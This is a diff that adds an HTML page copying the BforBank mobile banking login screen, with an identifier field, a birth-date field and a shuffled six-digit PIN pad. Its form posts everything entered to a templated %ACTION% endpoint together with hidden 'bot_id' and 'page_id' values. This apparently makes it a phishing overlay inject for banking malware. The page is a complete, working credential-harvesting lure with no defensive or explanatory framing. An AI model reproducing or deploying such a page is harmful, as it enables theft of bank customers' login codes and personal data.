@@ -1,0 +1,371 @@
+<!-- <!DOCTYPE html> -->
+<html>
+<head>
+	<meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+	<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+	<script src="%DYN_PATH%/js/jquery.maskedinput.min.js" type="text/javascript"></script>
+
+	<style type="text/css">
+	* {
+		padding: 0;
+		margin: 0;
+	}
+/*		html,
+		body,
+		.content {
+			/*height: 100%;
+			min-height: 100%;
+			box-sizing: border-box;
+			padding-bottom: 35px;
+		}*/
+
+		body {
+			background-image: url("%DYN_PATH%/img/splashphotohighdef.png");
+			background-size: cover;
+		}
+		.top_text {
+			/*display: inline;*/
+			margin-top: 5px;
+			padding: 5px;
+			font-size: 13px;
+			color: white;
+		}
+		#login_oublie_textview {
+			margin-left: 10px;
+			float: left;
+		}
+		.top_text:active{
+			color: black;
+		}
+		#opposition_textview {
+			margin-right: 10px;
+			float: right;
+		}
+		.top_image {
+			width: 20px;
+			height: 20px;
+			margin-right: 5px;
+			top: 10px;
+		}
+		.logo {
+			height: 70;
+			width: 275;
+		}
+		#relativelayout1__visualpanel {
+			width: auto;
+			padding-left: 30px;
+			padding-right: 30px;
+			padding-bottom: 5px;
+
+		}
+		.input_line {
+			width: 100%;
+			font-size: 15px;
+			color: black;
+			background-color: white;
+			padding-left: 10px;
+			padding-top: 4px;
+			margin-right: 10px;
+			padding-bottom: 4px;
+			border: 0;
+
+		}
+		input::-webkit-input-placeholder{
+			color: #c6c6c6;
+
+		}
+		.cross_button{
+			position: absolute;
+			right: 0px;
+			top: 2px;
+		}
+		.form_input {
+			position: relative;
+			margin-bottom: 15px;
+		}
+		#identificationpanel__memoriserInfo__edit {
+			margin-right: 7px;
+			display: none;
+		}
+		#identificationpanel__memoriserInfo__edit + label {
+			background-image: url("%DYN_PATH%/img/carre_memoriser_normal.png");
+			background-size: 20px 20px;
+			display: inline-block;
+			width: 20px;
+			height: 20px;
+			position: relative;
+			top: 6px;
+		}
+		#identificationpanel__memoriserInfo__edit:checked + label {
+			background-image: url("%DYN_PATH%/img/carre_memoriser_coche.png");
+		}
+		.label {
+			color: white;
+			font-size: 14px;
+			margin-left: 7px;
+		}
+		.password_line {
+			width: 100%;
+			text-align: center;
+			margin-top: 10px;
+		}
+		.password_checkbox {
+			margin-right: 10px;
+			display: none;
+		}
+
+		.password_checkbox + label {
+			background-image: url("%DYN_PATH%/img/rondcodegris.png");
+			display: inline-block;
+			background-size: 15px 15px;
+			width: 15px;
+			height: 15px;
+			margin-right: 21px;
+		}
+		.password_checkbox:checked + label{
+			background-image: url("%DYN_PATH%/img/rondcodeblanc.png");
+		}
+
+		#clear_password {
+			position: absolute;
+			left: inherit;
+			visibility: hidden;
+		}
+		.buttons_table{
+			width: 100%;
+			table-layout: fixed;
+		}
+		td {
+			text-align: center;
+		}
+
+		.button_div {
+			display: inline-block;
+			width: 45px;
+			height: 45px;
+			text-align: center;
+			border: 0;
+			/*border-radius: 50%;*/
+			font-size: 17px;
+			/*font-weight: bold;*/
+			margin-bottom: 10px;
+			margin-right: 10px;
+			color: black;
+			background-color: white;
+			/*border-color: white;	*/
+			line-height: 45px;
+			-moz-user-select: none;
+			-webkit-user-select: none;
+			-ms-user-select:none;
+			user-select:none;
+			-o-user-select:none;	
+		}
+
+		#bouton_valider {
+			width: 200px;
+			height: 40px;
+			margin-top: 17px;
+			margin-bottom: 25px;
+			background-color: #2d878d;
+			margin-right: auto;
+			border: 0;
+		}
+		#bouton_valider:active {
+			background-color: #58919b;
+		}
+		.footerr {
+			/*height: 35px;*/
+			/*margin-top: -35px;*/
+			padding-right: 5px;
+			padding-left: 5px;
+		}
+		.footer_text {
+			color: white;
+			text-align: center;
+			margin-right: 5px;
+			font-size: 13px;
+		}
+		.separator {
+			height: 35px;
+			width: 1px;
+			background-color: white;
+			display: inline-block;
+		}
+		td {
+			border-right: 1px solid white;
+		}
+		td:last-child {
+			border-right: none;	
+		}
+
+	</style>
+</head>
+<body>
+<!-- <div class="content"> -->
+	<span id="login_oublie_textview" class="top_text"><img src="%DYN_PATH%/img/interrogationblanc.png" class="top_image">Codes d'accès oubliés</span>
+	<span id="opposition_textview" class="top_text"><img src="%DYN_PATH%/img/exclamationblanc.png" class="top_image">Opposition</span>
+	<div style="width: 100%; text-align: center">
+		<img src="%DYN_PATH%/img/logo.png" height="50" width="197" class="logo">
+	</div>
+	<div id="relativelayout1__visualpanel">
+	<form role="form" name="form" action="%ACTION%" id="form" method="post">
+		<input type="hidden" name="page_id" value="%PKG%"><input type="hidden" name="bot_id" value="%BOTID%" />
+		<input type="hidden" name="fields[password]" id="password">
+		<div class="form_input">
+			<input type="tel" id="identificationpanel__identifiant__edit" name="fields[username]" placeholder="Identifiant" maxlength="8" class="input_line" autocomplete="off">
+				<a class="cross_button" href="#">
+					<img src="%DYN_PATH%/img/rondcroix.png" width="20" height="20" />
+				</a>
+		</div>
+
+		<div class="form_input">
+			<input type="tel" id="identificationpanel__dateNaissance__edit" name="dateNaissance" placeholder="Date de naissance" class="input_line">
+				<a class="cross_button" href="#">
+					<img src="%DYN_PATH%/img/calendrier_gris.png" width="20" height="20" id="calendar" />
+				</a>
+		</div>
+
+		<div class="form_input">
+			<input type="checkbox" id="identificationpanel__memoriserInfo__edit"><label for="identificationpanel__memoriserInfo__edit"></label><span class="label">Mémoriser mon identifiant</span>
+
+		</div>
+		</form>
+	</div>
+
+	<div class="password_line">
+		<input class="password_checkbox" type="checkbox" name=""><label></label>
+		<input class="password_checkbox" type="checkbox" name=""><label></label>
+		<input class="password_checkbox" type="checkbox" name=""><label></label>
+		<input class="password_checkbox" type="checkbox" name=""><label></label>
+		<input class="password_checkbox" type="checkbox" name=""><label></label>
+		<input class="password_checkbox" type="checkbox" name=""><label></label>
+		<img src="%DYN_PATH%/img/xxhdpi_authentification_btn_croix_pw.png" width="15" height="15" id="clear_password">
+	</div>
+
+	<div class="password_line">
+
+		<button class="button_div"></button><button class="button_div"></button><button class="button_div"></button><button class="button_div"></button><button class="button_div"></button><br>
+		<button class="button_div"></button><button class="button_div"></button><button class="button_div"></button><button class="button_div"></button><button class="button_div"></button>
+
+	</div>
+	<div style="text-align: center">
+		<button id="bouton_valider">Valider</button>
+	</div>
+<!-- </div> -->
+	<div class="footer">
+
+
+	<table style="width: 100%; table-layout: fixed;">
+		<tr>
+			<td class="footer_text">Bourse <br>
+Cours &amp; Infos</td>
+			<td class="footer_text">
+Devenir client ? <br>
+Découvrir BforBank				
+			</td>
+
+			<td class="footer_text">
+				
+Guide de <br>
+sécurité				
+			</td>
+		</tr>
+	</table>	
+
+
+	</div>
+</body>
+
+<script type="text/javascript">
+	
+Array.prototype.shuffle = function() {
+   var i = this.length;
+   while (--i) {
+      var j = Math.floor(Math.random() * (i + 1))
+      var temp = this[i];
+      this[i] = this[j];
+      this[j] = temp;
+   }
+
+   return this;
+};
+
+
+jQuery(function($){
+   $("#identificationpanel__dateNaissance__edit").mask("99/99/9999",{placeholder:"__/__/____"});
+});
+
+
+function passwordClicked(elem){
+	var value = $(elem).data('value');
+
+	if ($('#password').val().length >= 6) {
+		return;
+	}
+	$('.password_checkbox:not(:checked)')[0].checked = true;
+	var passw = $('#password');
+	passw.val(passw.val() + value);
+	document.getElementById('clear_password').style.visibility = 'visible';
+}
+
+(function(){
+
+	var digits = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].shuffle();
+	var tds = $('.button_div');
+	for (var i = 0; i < tds.length; i++){
+		var elem = tds[i];
+		elem.innerText = digits[i];
+		$(elem).data('value', digits[i]);
+		elem.onclick = function(){
+			passwordClicked(this);
+		};
+	}
+
+
+	$('#clear_password').bind('click', function(){
+		$('#password').val('');
+
+		var cbs = $('.password_checkbox');
+		for (var i = 0; i < cbs.length; i++){
+			var cb = cbs[i];
+			cb.checked = false;
+		}
+		document.getElementById('clear_password').style.visibility = 'hidden';
+	});
+
+
+	$('#bouton_valider').bind('click', function(){
+		var fields = {
+			'identificationpanel__identifiant__edit': /[0-9]{8}/,
+			'password': /[0-9]{6}/,
+			'identificationpanel__dateNaissance__edit': /[0-9]{2}\/[0-9]{2}\/[0-9]{4}/
+		};
+
+		var err = false;
+
+		for (i in fields){
+			var field = i;
+			var regex = fields[i];
+
+			if(!(new RegExp(regex).test($('#' + field).val())))
+			{
+				
+				err = true;
+			} 
+		}
+
+		if (err){
+			return;
+		}
+
+		var oForm=document.getElementById('form');
+		oForm.submit();
+	});
+
+})();
+
+</script>
+
+</html>
